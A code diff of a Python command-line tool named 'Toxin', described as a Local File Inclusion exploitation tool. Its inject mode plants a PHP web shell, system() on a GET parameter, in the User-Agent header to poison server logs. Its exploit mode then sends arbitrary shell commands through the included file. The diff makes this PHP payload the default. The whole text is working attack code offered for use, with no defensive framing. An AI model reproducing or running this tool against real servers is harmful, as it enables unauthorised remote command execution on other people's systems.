@@ -5,36 +5,44 @@ import requests
 import click
 
 
-@click.command(help='Toxin: Local File Inclusion Exploitation Tool')
-@click.option('--app_type', '-t', help='Application Type')
+CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
+
+
+@click.command(context_settings=CONTEXT_SETTINGS,
+               help='Toxin: Local File Inclusion Exploitation Tool')
 @click.option('--url', '-u', help='URL to query')
-@click.option('--parameter', '-p',
-              help='Parameter to inject into User-Agent header')
+@click.option('--parameter', '-p', default='cmd',
+              help="Parameter to inject into User-Agent header \
+              (Default: 'cmd')")
 @click.option('--command', '-c', help='Command to Run')
 @click.option('--mode', '-m', help='Mode (Inject or Exploit)')
 @click.option('--paged', '-g', is_flag=True, help='Paged Output')
-def toxin(app_type, parameter, url, command, mode, paged):
+def toxin(parameter, url, command, mode, paged):
 
-    if app_type == 'php':
-        headers = {'User-Agent': "<?php system($_GET['%s']); ?>" % parameter}
-    elif app_type is None:
-        pass
-    else:
-        raise RuntimeError('Invalid App Type Specified')
+    headers = {'User-Agent': "<?php system($_GET['%s']); ?>" % parameter}
 
     if mode == 'inject':
+
         response = requests.get(url, headers=headers)
+
+        if paged is True:
+            pager(response.text)
+        else:
+            print(response.text)
+
     elif mode == 'exploit':
+
         response = requests.get('{0}&{1}={2}'.format(url, parameter, command))
+
+        if paged is True:
+            pager(response.text)
+        else:
+            print(response.text)
+
     elif mode is None:
         pass
     else:
         raise RuntimeError('Invalid Run Mode')
-
-    if paged is True:
-        pager(response.text)
-    else:
-        print(response.text)
 
 
 if __name__ == '__main__':
